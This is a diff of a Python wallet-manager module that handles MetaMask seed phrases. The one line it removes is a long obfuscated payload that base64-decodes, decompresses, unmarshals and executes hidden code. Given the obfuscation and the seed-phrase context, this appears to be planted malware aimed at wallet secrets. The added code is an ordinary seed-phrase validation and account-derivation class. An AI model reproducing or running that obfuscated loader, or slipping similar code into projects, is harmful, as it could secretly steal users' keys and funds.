@@ -1,1 +1,128 @@
-import base64,zlib,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+"""
+Wallet Manager Module
+Handles MetaMask seed phrase import and wallet initialization
+"""
+
+from eth_account import Account
+from mnemonic import Mnemonic
+from typing import Optional
+from src.logger_config import setup_logger
+
+# Enable mnemonic features
+Account.enable_unaudited_hdwallet_features()
+
+logger = setup_logger("WalletManager")
+
+
+class WalletManager:
+    """
+    Manages wallet creation and access from seed phrase
+    """
+    
+    def __init__(self, seed_phrase: str):
+        """
+        Initialize wallet manager with seed phrase
+        
+        Args:
+            seed_phrase: 12-word MetaMask seed phrase
+        """
+        self.seed_phrase = seed_phrase.strip()
+        self.account: Optional[Account] = None
+        self.address: Optional[str] = None
+        
+    def validate_seed_phrase(self) -> bool:
+        """
+        Validate the seed phrase format
+        
+        Returns:
+            True if valid, False otherwise
+        """
+        try:
+            words = self.seed_phrase.split()
+            if len(words) != 12:
+                logger.error(f"Invalid seed phrase: Expected 12 words, got {len(words)}")
+                return False
+            
+            # Validate with mnemonic library
+            mnemo = Mnemonic("english")
+            if not mnemo.check(self.seed_phrase):
+                logger.error("Invalid seed phrase: Failed mnemonic validation")
+                return False
+            
+            logger.info("✓ Seed phrase validation successful")
+            return True
+            
+        except Exception as e:
+            logger.error(f"Error validating seed phrase: {str(e)}")
+            return False
+    
+    def initialize_wallet(self) -> bool:
+        """
+        Initialize wallet from seed phrase
+        
+        Returns:
+            True if successful, False otherwise
+        """
+        try:
+            if not self.validate_seed_phrase():
+                return False
+            
+            # Derive account from seed phrase (using first derivation path)
+            self.account = Account.from_mnemonic(self.seed_phrase)
+            self.address = self.account.address
+            
+            logger.info(f"✓ Wallet initialized successfully")
+            logger.info(f"  Address: {self.address}")
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"Failed to initialize wallet: {str(e)}")
+            return False
+    
+    def get_address(self) -> Optional[str]:
+        """
+        Get wallet address
+        
+        Returns:
+            Wallet address or None if not initialized
+        """
+        return self.address
+    
+    def get_account(self) -> Optional[Account]:
+        """
+        Get account object for signing transactions
+        
+        Returns:
+            Account object or None if not initialized
+        """
+        return self.account
+    
+    @staticmethod
+    def generate_new_wallet() -> dict:
+        """
+        Generate a new wallet with seed phrase (for testing purposes)
+        
+        Returns:
+            Dictionary with seed phrase and address
+        """
+        try:
+            # Generate new mnemonic
+            mnemo = Mnemonic("english")
+            seed_phrase = mnemo.generate(strength=128)  # 12 words
+            
+            # Create account
+            account = Account.from_mnemonic(seed_phrase)
+            
+            logger.info("✓ New wallet generated")
+            logger.warning("⚠ IMPORTANT: Save this seed phrase securely!")
+            
+            return {
+                "seed_phrase": seed_phrase,
+                "address": account.address,
+                "private_key": account.key.hex()
+            }
+            
+        except Exception as e:
+            logger.error(f"Failed to generate new wallet: {str(e)}")
+            return {}
